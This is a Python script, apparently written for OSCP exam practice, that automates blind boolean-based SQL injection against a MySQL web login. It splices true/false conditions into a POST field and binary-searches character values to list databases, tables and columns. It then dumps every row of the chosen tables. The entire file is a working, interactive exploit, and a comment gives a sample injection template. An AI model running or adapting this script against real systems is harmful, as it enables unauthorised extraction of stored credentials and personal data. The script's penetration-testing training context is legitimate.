#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# Blind boolean-based SQLi dumper (MySQL) - interactive drill-down
# Oracle = TRUE/FALSE difference in the HTTP response.
# Binary search on ASCII per character (~8 requests/char, 0-255 range).
# Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
# Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
# ---------------------------------------------------------------------------
import requests
import sys

# --- Interactive config ----------------------------------------------------
print("=== blind SQLi dumper ===")
URL          = input("Target URL                                   : ").strip()
INJ_FIELD    = input("Injectable POST field name (e.g. username)   : ").strip()
OTHER_FIELD  = input("Other POST field name (e.g. password)        : ").strip()
OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip()
# Template with [INJECT] where the boolean condition is spliced in.
# Example that worked in testing:  kitty' AND [INJECT]-- -
TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
# A string that appears ONLY when the query returns NO row (login failed).
# Its ABSENCE from the response = condition TRUE.
FALSE_MARKER = input("String shown only on FALSE/failed response   : ").strip()

# MySQL system schemas to skip when dumping "all" (still listed on screen)
SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]

session = requests.Session()

# --- Core oracle -----------------------------------------------------------
def oracle(condition):
    """Send one boolean condition, return True if the app signals TRUE."""
    payload = TEMPLATE.replace("[INJECT]", condition)
    r = session.post(URL, data={INJ_FIELD: payload, OTHER_FIELD: OTHER_VALUE})
    return FALSE_MARKER not in r.text

def extract_char(subquery, pos):
    """Binary search the byte value (0-255) of one character at position pos."""
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ascii(substring(({subquery}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_string(subquery, live=True):
    """Pull a string one char at a time until a NULL/empty char (value 0) ends it."""
    out, pos = "", 1
    while True:
        val = extract_char(subquery, pos)
        if val == 0:              # past end of string -> done
            break
        ch = chr(val)
        out += ch
        if live:
            sys.stdout.write(ch)
            sys.stdout.flush()
        pos += 1
    return out

def extract_number(subquery):
    """Binary search a numeric value directly (used for row counts)."""
    lo, hi = 0, 1
    while oracle(f"({subquery})>{hi}"):     # grow the ceiling first
        hi *= 2
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({subquery})>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

# --- Enumeration helpers ---------------------------------------------------
def get_databases():
    q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
    s = extract_string(q, live=False)
    return s.split(",") if s else []

def get_tables(db):
    q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
         f"WHERE table_schema='{db}'")
    s = extract_string(q, live=False)
    return s.split(",") if s else []

def get_columns(db, table):
    q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
         f"WHERE table_schema='{db}' AND table_name='{table}'")
    s = extract_string(q, live=False)
    return s.split(",") if s else []

def dump_table(db, table):
    cols = get_columns(db, table)
    if not cols:
        print(f"      (no columns found for {db}.{table})")
        return
    # concat_ws joins columns with | ; 0x7c is hex for | (avoids quote issues).
    # Per-row LIMIT avoids group_concat's 1024-byte truncation on big tables.
    col_expr = "concat_ws(0x7c," + ",".join(cols) + ")"
    rows = extract_number(f"SELECT count(*) FROM {db}.{table}")
    print(f"      ({rows} row(s), columns: {'|'.join(cols)})")
    for i in range(rows):
        row_q = f"SELECT {col_expr} FROM {db}.{table} LIMIT {i},1"
        sys.stdout.write(f"      [{i}] ")
        extract_string(row_q, live=True)
        print()

# --- Interactive chooser ---------------------------------------------------
def choose(items, label):
    """Show a numbered list; return the full list (all) or a one-item list."""
    print(f"\nAvailable {label}s:")
    print("   0) ALL")
    for idx, it in enumerate(items, 1):
        print(f"   {idx}) {it}")
    while True:
        pick = input(f"Select {label} (number, 0=all): ").strip()
        if pick == "0":
            return items
        if pick.isdigit() and 1 <= int(pick) <= len(items):
            return [items[int(pick) - 1]]
        print("   invalid choice, try again.")

# --- Main walk -------------------------------------------------------------
def main():
    print("\n[*] Enumerating databases...")
    all_dbs = get_databases()
    print(f"[+] Found: {', '.join(all_dbs)}")

    # non-system dbs are the sensible dump candidates; keep system ones selectable
    candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
    chosen_dbs = choose(candidates, "database")

    for db in chosen_dbs:
        print(f"\n[DB] {db}")
        print("[*] Enumerating tables...")
        tables = get_tables(db)
        if not tables:
            print("    (no tables)")
            continue
        # only prompt per-table when a single DB was chosen; dumping "all DBs"
        # dumps every table to avoid a prompt storm
        if len(chosen_dbs) == 1:
            tables = choose(tables, "table")
        else:
            print(f"[+] Tables: {', '.join(tables)}")

        for table in tables:
            print(f"  [TABLE] {db}.{table}")
            dump_table(db, table)

    print("\n[*] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
